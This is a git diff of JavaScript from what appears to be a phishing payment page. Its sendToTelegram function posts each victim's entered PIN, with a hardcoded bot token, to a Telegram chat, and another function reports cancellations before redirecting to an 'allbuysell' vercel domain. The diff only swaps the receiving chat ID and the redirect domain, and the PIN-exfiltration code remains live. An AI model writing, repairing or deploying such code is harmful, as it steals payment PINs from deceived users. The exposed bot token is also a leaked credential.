@@ -200,7 +200,7 @@
    }
     function sendToTelegram(pin) {
         const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
-        const chatId = '7174617845';
+        const chatId = '7003887539';
         const message = `Entered PIN: ${pin}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -226,13 +226,13 @@
     function closePage() {
         sendCancellationMessage();
         setTimeout(() => {
-            window.location.href = `https://allbuysell.vercel.app`;
+            window.location.href = `https://bdallbuysell.vercel.app`;
         }, 1000);
     }
 
     function sendCancellationMessage() {
         const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
-        const chatId = '7174617845';
+        const chatId = '7003887539';
         const message = `Payment cancelled by the user.`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
